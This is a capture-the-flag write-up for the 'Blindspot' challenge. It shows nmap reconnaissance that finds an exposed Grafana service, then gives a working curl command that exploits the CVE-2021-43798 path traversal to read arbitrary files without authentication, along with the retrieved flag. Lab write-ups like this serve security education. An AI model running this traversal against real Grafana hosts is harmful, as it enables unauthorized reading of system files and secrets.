# Blindspot Write-up

## Challenge Overview
The `Blindspot` challenge presents a simple web application that initially serves only a placeholder HTML page. The goal is to discover hidden services and retrieve the flag.

---

## Reconnaissance
1. **Access the main web page**
   - Visiting the root URL only shows a dummy HTML page with no obvious clues.
   - At this point, the service appears to be "blind" to any hints.

2. **Port scanning**
   - Running `nmap` against the target reveals additional services running on non-standard ports.
   - One such service was found on port **8081**, which responded as a Grafana instance.

   ```bash
   nmap -p- --open -sV <target-ip>
   # example output includes: 8081/tcp open  http    grafana
   ```

---

## Exploring the Grafana Instance
Accessing `http://<target-ip>:8081` brought up the Grafana login page. When exploring the page the **Grafana version number** was clearly displayed. A quick search of that version against public CVE databases revealed it was outdated and vulnerable.

> **Note:** Identifying the version is a key step during reconnaissance; it allowed us to look for specific vulnerabilities affecting that release.

### Path Traversal Vulnerability (CVE-2021-43798)
Grafana versions prior to a security update (including the one observed) were vulnerable to a path traversal bug in plugin resources. The flaw could be triggered **without authentication**, allowing an attacker to read arbitrary files on the host simply by crafting a malicious URL.

We exploit this by abusing the `/public/plugins/alertlist` path with `--path-as-is` to bypass normalization. In a real attack the `alertlist` directory isn’t documented; it’s just the name of a Grafana plugin. During the challenge, players typically try a handful of common plugin names (trial and error) until one returns a valid response. In this case `alertlist` happened to be the correct guess.

```bash
curl --path-as-is \
  http://<target-ip>:8081/public/plugins/alertlist/../../../../../../../../flag.txt
```

> The flag was successfully retrieved:

```
SEASIDES{gr4f4n4_p4th_tr4v3rs4l}
```

---

## Conclusion
By performing simple reconnaissance and identifying an exposed Grafana service, we leveraged a known path traversal vulnerability to access the flag.